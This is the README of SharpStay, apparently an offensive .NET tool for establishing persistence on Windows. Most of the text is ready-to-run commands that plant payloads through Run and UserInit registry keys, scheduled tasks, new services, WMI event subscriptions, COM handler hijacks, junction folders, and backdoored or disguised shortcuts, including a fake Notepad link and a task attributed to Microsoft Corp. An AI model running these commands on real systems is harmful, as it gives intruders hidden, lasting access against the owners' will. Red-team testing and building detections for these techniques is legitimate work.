
### SharpStay - .NET Persistence 


#### Building
To compile open Visual Studio project and compile for release.

#### Options

  * Elevated Registry Keys
  * Elevated UserInit Registry Key
  * Elevated Scheduled Task
  * Elevated Create Service
  * Elevated WMI Event Subscription


  * Non-Elevated InitMprLogonScript Registry Key
  * Non-Elevated Scheduled Task COM Handler Hijack
  * Non-Elevated Junction Folder


  * Misc Add Scheduled Task Action
  * Misc Startup Directory
  * Misc New LNK
  * Misc Backdoor LNK
  * Misc Task Names
  * Misc List Scheduled Tasks
  * Misc List Running Services
  * Misc Get Scheduled Task COM Handlers

```
Sharpstay.exe action=ElevatedRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command="C:\Windows\temp\fun.exe"
```

```
Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command="C:\Windows\temp\fun.exe"
```

```
Sharpstay.exe action=UserInitMprLogonScriptKey command="C:\Windows\temp\fun.exe"
```

```
Sharpstay.exe action=ElevatedUserInitKey command="C:\Windows\temp\fun.exe"
```

```
Sharpstay.exe action=ScheduledTask taskname=TestTask command="C:\windows\temp\file.exe" runasuser=user1 triggertype=logon author=Microsoft Corp. description="Test Task" logonuser=user1
```

```
Sharpstay.exe action=ScheduledTaskAction taskname=TestTask command="C:\Windows\temp\fun.exe" folder="\\" actionid=ExecAction
```

```
Sharpstay.exe action=SchTaskCOMHijack clsid={a47af52a-27f9-4426-bd2b-727050712db1} dllpath="C:\windows\temp\fun.dll"
```

```
Sharpstay.exe action=CreateService servicename=TestService command="C:\Windows\temp\fun.exe"
```

```
Sharpstay.exe action=WMIEventSub command="C:\Windows\temp\fun.exe" eventname=Debugger attime=startup 
```

```
Sharpstay.exe action=JunctionFolder dllpath="C:\windows\temp\fun.dll guid={a47af52a-27f9-4426-bd2b-727050712db1}
```

```
Sharpstay.exe action=NewLNK filepath="C:\users\admin\desktop" lnkname="Notepad.lnk" lnktarget="C:\Windows\temp\file.exe" lnkicon="C:\Windows\system32\notepad.exe"
```

```
Sharpstay.exe action=BackdoorLNK command="C:\Windows\temp\fun.exe" lnkpath="C:\users\user\desktop\Excel.lnk"
```

```
Sharpstay.exe action=ListTaskNames
```

```
Sharpstay.exe action=ListScheduledTasks
```

```
Sharpstay.exe action=ListRunningServices
```

```
Sharpstay.exe action=GetScheduledTaskCOMHandler
```

`cleanup=true` is an option for each persistence type.

Part of [StayKit](https://github.com/0xthirteen/StayKit)